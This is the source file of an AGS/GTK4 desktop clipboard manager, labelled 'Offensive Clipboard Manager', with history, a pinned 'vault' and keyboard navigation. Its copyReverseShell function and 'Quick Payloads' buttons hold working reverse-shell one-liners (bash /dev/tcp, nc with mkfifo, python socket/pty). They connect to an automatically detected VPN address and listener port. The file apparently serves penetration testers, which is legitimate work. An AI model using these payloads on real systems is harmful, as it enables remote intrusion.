import { execAsync } from "ags/process"; 
import { Gtk } from "ags/gtk4"; 
import Divider from "../common/Divider";
import OkButton, { OkButtonHorizontalPadding } from "../common/OkButton";
import AsyncClipboardPicture from "./AsyncClipboardPicture";
import AsyncClipboardLabel from "./AsyncClipboardLabel";

import { projectDir } from "../../app";
import { createState } from "ags";
import GLib from "gi://GLib?version=2.0";
import Gio from "gi://Gio?version=2.0";
import Gdk from "gi://Gdk?version=4.0"; 
import { monitorFile } from "ags/file";
import { timeout, Timer } from "ags/time";
import { toggleIntegratedClipboardManager } from "./IntegratedClipboardManager";
import { AnimatedFor } from "../common/AnimatedFor";

let cliphistStarted = false;

type Entry = {
    number: number;
    value: string;
    pinnedContent?: string;
};

type PinnedVaultItem = {
    id: number;
    preview: string;
    content: string;
};

// ─────────────────────────────────────────────
//  HELPER: detecta entradas corruptas
// ─────────────────────────────────────────────
function isCorruptEntry(value: string): boolean {
    if (!value || value.trim() === "") return true;
    if (value.startsWith("Accessor {")) return true;
    if (value.startsWith("[object ")) return true;
    if (/^\s+$/.test(value)) return true;
    return false;
}

// ─────────────────────────────────────────────
//  LÓGICA TÁCTICA (LHOST / LPORT)
// ─────────────────────────────────────────────

async function getLhost(): Promise<string> {
    try {
        const cmd = "ip -o -4 addr show | grep -E 'tun[0-9]+|wg[0-9]+' | awk '{print $4}' | cut -d/ -f1 | head -n 1";
        const ip = (await execAsync(['bash', '-c', cmd])).trim();
        return ip || (await execAsync(['bash', '-c', "hostname -I | awk '{print $1}'"])).trim() || "127.0.0.1";
    } catch { return "127.0.0.1"; }
}

async function getLport(): Promise<string> {
    try {
        const cmd = "ss -ltnp | grep -E 'nc|ncat|python|ruby' | awk '{print $4}' | cut -d: -f2 | head -n 1";
        const port = (await execAsync(['bash', '-c', cmd])).trim();
        return port || "4444";
    } catch { return "4444"; }
}

async function copyReverseShell(type: 'bash' | 'nc' | 'python') {
    const ip = await getLhost();
    const port = await getLport();
    let shell = "";

    switch (type) {
        case 'bash':   shell = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`; break;
        case 'nc':     shell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`; break;
        case 'python': shell = `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`; break;
    }

    await execAsync(['bash', '-c', `echo -n "${shell}" | wl-copy`]).catch(() => {});
    execAsync(['notify-send', '-a', 'OkPanel Security', `Payload ${type.toUpperCase()} Copiado`, `LHOST: ${ip}\nLPORT: ${port}`]).catch(() => {});
}

// ─────────────────────────────────────────────
//  PERSISTENCIA Y BOVEDA
// ─────────────────────────────────────────────

const PIN_FILE = `${GLib.getenv("XDG_CACHE_HOME") ?? `${GLib.get_home_dir()}/.cache`}/ags/pinned_clipboard.json`;
let initialPinned: PinnedVaultItem[] = [];

try {
    if (GLib.file_test(PIN_FILE, GLib.FileTest.EXISTS)) {
        const [, contents] = GLib.file_get_contents(PIN_FILE);
        const parsed = JSON.parse(new TextDecoder().decode(contents));
        initialPinned = parsed.map((p: any) => ({
            id: p.id || -(Math.floor(Math.random() * 1000000) + 1),
            preview: p.preview || p,
            content: p.content || p
        }));
    }
} catch (e) { console.error("Error cargando fijados:", e); }

const [pinnedValues,   setPinnedValues]   = createState<PinnedVaultItem[]>(initialPinned);
const [historyEntries, setHistoryEntries] = createState<Entry[]>([]);
const [searchQuery,    setSearchQuery]    = createState("");
const [currentTab,     setCurrentTab]     = createState<'history' | 'pinned'>('history');
const [displayMode,    setDisplayMode]    = createState<'history' | 'pinned' | 'search'>('history');
const [selectedId,     setSelectedId]     = createState<number | null>(null);

function savePinned(pinned: PinnedVaultItem[]) {
    try {
        const dir = GLib.path_get_dirname(PIN_FILE);
        GLib.mkdir_with_parents(dir, 0o755);
        GLib.file_set_contents(PIN_FILE, new TextEncoder().encode(JSON.stringify(pinned)));
    } catch (e) { console.error("Error fatal al guardar la boveda:", e); }
}

async function togglePin(entry: Entry) {
    try {
        let current = [...pinnedValues.get()];
        const isPinned = current.some(p => p.preview === entry.value);

        if (isPinned) {
            current = current.filter(p => p.preview !== entry.value);
            setPinnedValues(current);
            savePinned(current);
            updateClipboardEntries();
            execAsync(['notify-send', '-a', 'OkPanel', '🗑️ Eliminado de la Boveda']).catch(() => {});
        } else {
            if (getImageType(entry) !== null) {
                execAsync(['notify-send', '-a', 'OkPanel', '⚠️ Imagenes no soportadas en boveda.']).catch(() => {});
                return;
            }

            let realData = entry.value;
            try {
                realData = await execAsync(`cliphist decode ${entry.number}`);
            } catch {
                console.warn("Fallo cliphist decode, usando preview como fallback.");
            }

            const newId = -(Math.floor(Math.random() * 1000000) + 1);
            current.push({ id: newId, preview: entry.value, content: realData });
            setPinnedValues(current);
            savePinned(current);
            updateClipboardEntries();
            execAsync(['notify-send', '-a', 'OkPanel', '📌 Payload asegurado en Boveda']).catch(() => {});
        }
    } catch (err) { console.error("Error critico en togglePin:", err); }
}

function getImageType(entry: Entry): string | null {
    const pattern = /^\[\[ binary data [\d.]+ \w+ ([a-z0-9]+) \d+x\d+ \]\]$/i;
    const match = entry.value.match(pattern);
    if (match) return match[1].toLowerCase();

    if (entry.value.startsWith("[[ binary data")) return "png";
    return null;
}

// ─────────────────────────────────────────────
//  MANEJO DE HISTORIAL
// ─────────────────────────────────────────────

export function startCliphist() {
    if (cliphistStarted) return;
    cliphistStarted = true;
    execAsync(`${projectDir}/shellScripts/cliphistStore.sh`).catch(() => {});
    execAsync(["bash", "-c", `wl-paste --type image --watch cliphist store`]).catch(() => {});
    watchForUpdates();
}

function watchForUpdates() {
    const dbPath = GLib.getenv("CLIPHIST_DB_PATH") ||
        `${GLib.getenv("XDG_CACHE_HOME") ?? `${GLib.get_home_dir()}/.cache`}/cliphist/db`;
    let debounceTimer: Timer | null = null;
    monitorFile(dbPath, (_file, event) => {
        if (event === Gio.FileMonitorEvent.CHANGED) {
            if (debounceTimer) debounceTimer.cancel();
            debounceTimer = timeout(200, () => {
                debounceTimer = null;
                updateClipboardEntries();
            });
        }
    });
}

export function updateClipboardEntries() {
    execAsync(["bash", "-c", "cliphist list || true"])
        .then((value) => {
            const currentPinned  = pinnedValues.get();
            const pinnedPreviews = currentPinned.map(p => p.preview);
            const unpinned: Entry[] = [];

            if (typeof value === "string" && value.trim() !== "") {
                value.split("\n").forEach(line => {
                    const parts = line.split("\t");
                    if (parts.length < 2) return;
                    
                    const numStr = parts[0];
                    const entryValue = parts.slice(1).join("\t").trim();

                    if (isCorruptEntry(entryValue)) return;

                    if (!pinnedPreviews.includes(entryValue)) {
                        unpinned.push({ number: parseInt(numStr, 10), value: entryValue });
                    }
                });
            }
            setHistoryEntries(unpinned);
        })
        .catch(() => {}); 
}

// ─────────────────────────────────────────────
//  ACCIONES DE COPIA / BORRADO
// ─────────────────────────────────────────────

function copyEntry(entry: Entry) {
    if (entry.number < 0 && entry.pinnedContent) {
        const delimiter = "EOF_PAYLOAD_" + Date.now();
        const cmd = `cat << '${delimiter}' | wl-copy\n${entry.pinnedContent}\n${delimiter}`;
        execAsync(["bash", "-c", cmd]).catch(() => {});
        return;
    }
    const imageType = getImageType(entry);
    const cmd = imageType !== null
        ? `cliphist decode ${entry.number} | wl-copy --type image/${imageType}`
        : `cliphist decode ${entry.number} | wl-copy`;
    execAsync(["bash", "-c", cmd]).catch(() => {});
}

function deleteEntry(entry: Entry) {
    let currentPinned = [...pinnedValues.get()];
    if (currentPinned.some(p => p.preview === entry.value)) {
        currentPinned = currentPinned.filter(p => p.preview !== entry.value);
        setPinnedValues(currentPinned);
        savePinned(currentPinned);
    }

    if (entry.number >= 0) {
        const delimiter = "EOF_DEL_" + Date.now();
        const payload   = `${entry.number}\t${entry.value}`;
        execAsync(["bash", "-c", `cat << '${delimiter}' | cliphist delete\n${payload}\n${delimiter}`])
            .then(() => updateClipboardEntries())
            .catch(() => {});
    } else {
        updateClipboardEntries();
    }
}

function wipeHistorySafe() {
    const unpinned = historyEntries.get();
    if (unpinned.length === 0) return;
    const payload   = unpinned.map(e => `${e.number}\t${e.value}`).join('\n');
    const delimiter = "EOF_CLIPHIST_DELETE";
    execAsync(["bash", "-c", `cat << '${delimiter}' | cliphist delete\n${payload}\n${delimiter}`])
        .then(() => updateClipboardEntries()).catch(() => {});
}

// ─────────────────────────────────────────────
//  RENDERIZADO DE ITEMS
// ─────────────────────────────────────────────

function ClipboardItem({ entry, isPersistent, selectedId, getScroll, getContentBox }: {
    entry: Entry;
    isPersistent: boolean;
    selectedId: any;
    getScroll: () => Gtk.ScrolledWindow | null;
    getContentBox: () => Gtk.Box | null;
}) {
    const isImage = getImageType(entry) !== null;

    return <box
        orientation={Gtk.Orientation.VERTICAL}
        canFocus={true}
        cssClasses={selectedId.as((id: number | null) => {
            const base = ["clipboard-item"];
            if (isPersistent) base.push("persistent-entry");
            if (id === entry.number) base.push("selected");
            return base;
        })}
        $={(self) => {
            const unsub = selectedId.subscribe((id: number | null) => {
                if (id !== entry.number) return;

                timeout(10, () => {
                    const sw = getScroll();
                    const contentBox = getContentBox();
                    if (!sw || !contentBox || !self.get_realized()) return;

                    const adj = sw.get_vadjustment();
                    const viewHeight = sw.get_height();
                    const currentTop = adj.get_value();

                    // FIX DEFINITIVO DE SCROLL: Bucle manual de cálculo Y
                    // Suma las posiciones Y de todos los contenedores padres hasta llegar a contentBox.
                    let y = 0;
                    let w: Gtk.Widget | null = self;
                    while (w && w !== contentBox) {
                        y += w.get_allocation().y;
                        w = w.get_parent() as Gtk.Widget | null;
                    }

                    const itemHeight = self.get_allocation().height;
                    const itemBottom = y + itemHeight;

                    if (itemBottom > currentTop + viewHeight) {
                        // El item está por debajo del área visible
                        adj.set_value(itemBottom - viewHeight + 20); 
                    } else if (y < currentTop) {
                        // El item está por encima del área visible
                        adj.set_value(Math.max(0, y - 20));
                    }
                });
            });

            self.connect("destroy", () => unsub());

            const motion = new Gtk.EventControllerMotion();
            motion.connect("enter", () => setSelectedId(entry.number));
            self.add_controller(motion);
        }}
    >
        <box spacing={4}>
            <box
                hexpand={true}
                $={(self) => {
                    const click = new Gtk.GestureClick();
                    click.connect("pressed", () => {
                        copyEntry(entry);
                        toggleIntegratedClipboardManager();
                    });
                    self.add_controller(click);
                }}
            >
                <box spacing={8} marginTop={8} marginBottom={8} marginStart={8} marginEnd={8}
                    $={(contentBox) => {
                        if (isPersistent) {
                            contentBox.append(<label label="󰐃" cssClasses={["pin-indicator"]} />);
                        }

                        if (isImage) {
                            contentBox.append(AsyncClipboardPicture({ cliphistId: entry.number }));
                        } else if (isPersistent) {
                            contentBox.append(<label label={String(entry.value)} halign={Gtk.Align.START} wrap={true} lines={2} hexpand={true} maxWidthChars={55} />);
                        } else {
                            contentBox.append(AsyncClipboardLabel({ cliphistId: entry.number }));
                        }
                    }}
                />
            </box>

            <box halign={Gtk.Align.END} spacing={2} marginTop={8} marginBottom={8} marginStart={8} marginEnd={8}>
                <OkButton
                    hpadding={OkButtonHorizontalPadding.THIN}
                    label={pinnedValues.as(p => p.some(v => v.preview === entry.value) ? "󰐃" : "󰤱")}
                    onClicked={() => togglePin(entry)}
                />
                <OkButton
                    hpadding={OkButtonHorizontalPadding.THIN}
                    label="󰅍"
                    onClicked={() => { copyEntry(entry); toggleIntegratedClipboardManager(); }}
                />
                <OkButton
                    hpadding={OkButtonHorizontalPadding.THIN}
                    label="󰆴"
                    onClicked={() => deleteEntry(entry)}
                />
            </box>
        </box>
        <Divider thin={true} />
    </box>;
}

// ─────────────────────────────────────────────
//  INTERFAZ PRINCIPAL
// ─────────────────────────────────────────────

export function ClipboardManagerContent() {

    const filteredHistory = historyEntries.as(arr => [...arr]);
    const filteredPinned  = pinnedValues.as(arr =>
        arr.map(p => ({ number: p.id, value: p.preview, pinnedContent: p.content }))
    );

    const searchResults = searchQuery.as(q => {
        if (!q) return [];
        const lq          = q.toLowerCase();
        const rawHistory  = historyEntries.get();
        const rawPinned   = pinnedValues.get().map(p => ({
            number: p.id, value: p.preview, pinnedContent: p.content
        }));
        return [
            ...rawHistory.filter(h => (h.value || "").toLowerCase().includes(lq)),
            ...rawPinned.filter(p  => (p.value || "").toLowerCase().includes(lq)),
        ];
    });

    const getActiveList = (): Entry[] => {
        const mode = displayMode.get();

        if (mode === 'search') {
            const q = searchQuery.get();
            if (!q) return [];
            const lq         = q.toLowerCase();
            const rawHistory = historyEntries.get();
            const rawPinned  = pinnedValues.get().map(p => ({
                number: p.id, value: p.preview, pinnedContent: p.content
            }));
            return [
                ...rawHistory.filter(h => (h.value || "").toLowerCase().includes(lq)),
                ...rawPinned.filter(p  => (p.value || "").toLowerCase().includes(lq)),
            ];
        }

        if (mode === 'history') return historyEntries.get();

        return pinnedValues.get().map(p => ({
            number: p.id, value: p.preview, pinnedContent: p.content
        }));
    };

    let scrollWinRef: Gtk.ScrolledWindow | null = null;
    let contentBoxRef: Gtk.Box | null = null;

    return <box orientation={Gtk.Orientation.VERTICAL} vexpand={true}>

        <box marginBottom={16}>
            <entry
                hexpand={true}
                cssClasses={["input"]}
                placeholderText="Buscar (Tab=Vistas | ↓/↑=Navegar | Enter=Copiar | Del=Borrar)"
                onChanged={(self) => {
                    const q = self.text || "";
                    setSearchQuery(q);
                    setSelectedId(null);
                    setDisplayMode(q !== "" ? 'search' : currentTab.get());
                    updateClipboardEntries();
                }}
                $={(self) => {
                    self.connect("map", () => {
                        timeout(150, () => { if (self?.grab_focus) self.grab_focus(); });
                    });

                    const keyCtrl = new Gtk.EventControllerKey();
                    keyCtrl.set_propagation_phase(Gtk.PropagationPhase.CAPTURE);

                    keyCtrl.connect("key-pressed", (_, keyval, _keycode, state) => {
                        const isCtrl = (state & Gdk.ModifierType.CONTROL_MASK) !== 0;

                        if (keyval === Gdk.KEY_Escape) {
                            toggleIntegratedClipboardManager();
                            return true;
                        }

                        if (keyval === Gdk.KEY_Tab || keyval === Gdk.KEY_ISO_Left_Tab) {
                            if (displayMode.get() === 'search') return true;
                            const next = currentTab.get() === 'history' ? 'pinned' : 'history';
                            setCurrentTab(next);
                            setDisplayMode(next);
                            setSelectedId(null);
                            return true;
                        }

                        const activeList = getActiveList();

                        if (keyval === Gdk.KEY_Return || keyval === Gdk.KEY_KP_Enter) {
                            const currentId    = selectedId.get();
                            const currentIndex = activeList.findIndex(e => e.number === currentId);
                            const itemToCopy   = currentIndex !== -1 ? activeList[currentIndex] : activeList[0];
                            if (itemToCopy) {
                                copyEntry(itemToCopy);
                                toggleIntegratedClipboardManager();
                            }
                            return true;
                        }

                        if (activeList.length === 0) return false;

                        let idx = activeList.findIndex(e => e.number === selectedId.get());

                        if (keyval === Gdk.KEY_Delete || (isCtrl && keyval === Gdk.KEY_BackSpace)) {
                            const currentId = selectedId.get();
                            if (currentId !== null) {
                                const item = activeList.find(e => e.number === currentId);
                                if (item) {
                                    deleteEntry(item);
                                    timeout(50, () => {
                                        const newList = getActiveList();
                                        if (newList.length > 0) {
                                            const newIdx = Math.min(idx === -1 ? 0 : idx, newList.length - 1);
                                            setSelectedId(newList[newIdx].number);
                                        } else {
                                            setSelectedId(null);
                                        }
                                    });
                                    return true;
                                }
                            }
                            return false;
                        }

                        if (keyval === Gdk.KEY_Down || (isCtrl && keyval === Gdk.KEY_j)) {
                            idx = idx === -1 ? 0 : Math.min(activeList.length - 1, idx + 1);
                            setSelectedId(activeList[idx]?.number ?? null);
                            return true;
                        }

                        if (keyval === Gdk.KEY_Up || (isCtrl && keyval === Gdk.KEY_k)) {
                            idx = idx === -1 ? activeList.length - 1 : Math.max(0, idx - 1);
                            setSelectedId(activeList[idx]?.number ?? null);
                            return true;
                        }

                        return false;
                    });

                    self.add_controller(keyCtrl);
                }}
            />
        </box>

        <box spacing={6} marginBottom={12} halign={Gtk.Align.CENTER}
             visible={displayMode.as(m => m !== 'search')}>
            <OkButton
                label="📋 Historial"
                cssClasses={currentTab.as(t => t === 'history' ? ["active-tab"] : [])}
                onClicked={() => { setCurrentTab('history'); setDisplayMode('history'); setSelectedId(null); }}
            />
            <OkButton
                label="📌 Boveda"
                cssClasses={currentTab.as(t => t === 'pinned' ? ["active-tab"] : [])}
                onClicked={() => { setCurrentTab('pinned'); setDisplayMode('pinned'); setSelectedId(null); }}
            />
        </box>

        <label label="Quick Payloads (LHOST/LPORT)" cssClasses={["labelSmall"]}
               halign={Gtk.Align.START} marginBottom={6} />
        <box spacing={6} marginBottom={12}>
            <OkButton hexpand={true} label="󱆃 Bash"
                onClicked={() => { copyReverseShell('bash'); toggleIntegratedClipboardManager(); }} />
            <OkButton hexpand={true} label="󰒍 NC"
                onClicked={() => { copyReverseShell('nc'); toggleIntegratedClipboardManager(); }} />
            <OkButton hexpand={true} label="󰌠 Py"
                onClicked={() => { copyReverseShell('python'); toggleIntegratedClipboardManager(); }} />
        </box>

        <Divider marginBottom={12} thin={true} />

        <box visible={displayMode.as(m => m === 'history')} marginBottom={16}>
            <OkButton hexpand={true} label="Purge History" primary={true} onClicked={wipeHistorySafe} />
        </box>

        <Gtk.ScrolledWindow 
            vexpand={true} 
            hscrollbarPolicy={Gtk.PolicyType.NEVER}
            $={(self) => { scrollWinRef = self; }}
        >
            <box orientation={Gtk.Orientation.VERTICAL} $={(self) => { contentBoxRef = self; }}>

                <box visible={displayMode.as(m => m === 'history')} orientation={Gtk.Orientation.VERTICAL}>
                    <AnimatedFor each={filteredHistory} id={it => String(it.number)} reverse={true}>
                        {(entry) => <ClipboardItem entry={entry} isPersistent={false} selectedId={selectedId} getScroll={() => scrollWinRef} getContentBox={() => contentBoxRef} />}
                    </AnimatedFor>
                </box>

                <box visible={displayMode.as(m => m === 'pinned')} orientation={Gtk.Orientation.VERTICAL}>
                    <AnimatedFor each={filteredPinned} id={it => String(it.number)} reverse={true}>
                        {(entry) => <ClipboardItem entry={entry} isPersistent={true} selectedId={selectedId} getScroll={() => scrollWinRef} getContentBox={() => contentBoxRef} />}
                    </AnimatedFor>
                </box>

                <box visible={displayMode.as(m => m === 'search')} orientation={Gtk.Orientation.VERTICAL}>
                    <AnimatedFor each={searchResults} id={it => String(it.number)} reverse={true}>
                        {(entry) => <ClipboardItem entry={entry} isPersistent={entry.number < 0} selectedId={selectedId} getScroll={() => scrollWinRef} getContentBox={() => contentBoxRef} />}
                    </AnimatedFor>
                </box>

            </box>
        </Gtk.ScrolledWindow>
    </box>;
}

export default function () {
    startCliphist(); 
    updateClipboardEntries();
    return <box cssClasses={["clipboardBox"]} orientation={Gtk.Orientation.VERTICAL} vexpand={true} marginTop={20} marginBottom={20} marginStart={20} marginEnd={20}>
        <label marginBottom={16} cssClasses={["labelMedium"]} label="🛡️ Offensive Clipboard Manager" />
        <ClipboardManagerContent />
    </box>;
}
